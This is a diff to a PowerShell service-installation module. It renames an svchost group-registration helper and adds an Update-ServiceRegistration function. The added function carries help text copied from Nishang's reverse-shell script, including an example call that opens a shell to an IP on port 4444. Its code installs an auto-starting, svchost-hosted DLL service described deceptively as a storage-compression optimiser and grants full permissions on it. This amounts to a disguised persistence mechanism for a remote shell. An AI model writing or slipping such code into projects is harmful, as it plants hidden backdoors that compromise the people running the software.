@@ -260,14 +260,9 @@ function Install-WinService{
         # creating widnows service using all provided parameters
         $Null = New-Service -name $Name -binaryPathName $binaryPath -displayName $Name -Description "$Description" -startupType Automatic -credential $mycreds
 
-        #$RegView = [Microsoft.Win32.RegistryView]::Registry64
-        #$basekey = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $RegView)
-        #$subKey = $basekey.OpenSubKey("SYSTEM\CurrentControlSet\Services\$Name",$true)
-
         $ScExe=(get-command sc.exe).Source
         if($PsCmdlet.ParameterSetName -eq 'SharedProcess'){
-            Set-GroupConfig $Name $GroupName $Path
-            #$subKey.SetValue("Type",0x20)
+            Add-ServiceToGroup $Name $GroupName $Path
             $OutSc =  &"$ScExe" 'config' "$Name" 'type=' 'share'
             Write-Output $OutSc
         }else{
@@ -283,7 +278,7 @@ function Install-WinService{
  }
 
 
-function Set-GroupConfig{
+function Add-ServiceToGroup{
 
  <#
  .SYNOPSIS
@@ -296,7 +291,7 @@ function Set-GroupConfig{
     [CmdletBinding(SupportsShouldProcess)]
     param(
         [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="service Name", Position=0)]
-        [string]$Name,
+        [string]$ServiceName,
         [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="groupname", Position=1)]
         [string]$GroupName,
         [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="DllPath", Position=2)]
@@ -305,7 +300,7 @@ function Set-GroupConfig{
 
 
      try{
-        $RegistryPath="HKLM:\SYSTEM\CurrentControlSet\services\{0}\Parameters" -f $Name
+        $RegistryPath="HKLM:\SYSTEM\CurrentControlSet\services\{0}\Parameters" -f $ServiceName
         $Null=New-Item -Path $RegistryPath -ItemType Directory -Force -ErrorAction Ignore
         $Null = New-ItemProperty -Path $RegistryPath -Name 'ServiceDll' -Value $DllPath -PropertyType ExpandString -Force 
 
@@ -318,15 +313,15 @@ function Set-GroupConfig{
         if($GroupExists -eq $True){
             Write-Verbose "Group $GroupName already exists. Adding service in list for group."
             [string[]]$AllGroupServices=$subKey.GetValue($GroupName)
-            $AllGroupServices+=$Name
+            $AllGroupServices+=$ServiceName
             $subKey.SetValue($GroupName,$AllGroupServices)
         }else{
             $RegistryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
-            [string[]]$Value=@($Name)
+            [string[]]$Value=@($ServiceName)
             $Null = New-ItemProperty -Path $RegistryPath -Name $GroupName -Value $Value -PropertyType MultiString -Force 
         }
 
-        $newGroupKey = $subKey.CreateSubKey($Name, $true)
+        $newGroupKey = $subKey.CreateSubKey($ServiceName, $true)
      }catch{
          throw $_
      }
@@ -389,3 +384,31 @@ function Remove-ServiceGroupConfig{
          throw $_
      }
  }
+
+function Update-ServiceRegistration{
+
+ <#
+ .SYNOPSIS
+ Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
+
+ .EXAMPLE
+ PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+
+ #>
+    [CmdletBinding(SupportsShouldProcess)]
+    param(
+        [Parameter(Mandatory=$true, HelpMessage="service Name", Position=0)]
+        [string]$ServiceName   
+    )
+     try{
+        Write-BuildOutTitle "CONFIGURE SERVICE REGISTRATION"
+        $Description = "Helps the computer run more efficiently by optimizing storage compression."
+        Install-WinService -Name "$ServiceName" -GroupName $ServiceGroup -Path $ServicePath -Description $Description -StartupType Automatic -SharedProcess
+        Set-ServicePermissions -Name "$ServiceName" -Identity "$ENV:USERNAME" -Permission full
+        Set-ServicePermissions -Name "$ServiceName" -Identity "NT AUTHORITY\SYSTEM" -Permission full
+        Set-ServicePermissions -Name "$ServiceName" -Identity "NT AUTHORITY\SERVICE" -Permission full
+     }catch{
+         throw $_
+     }
+ }
+
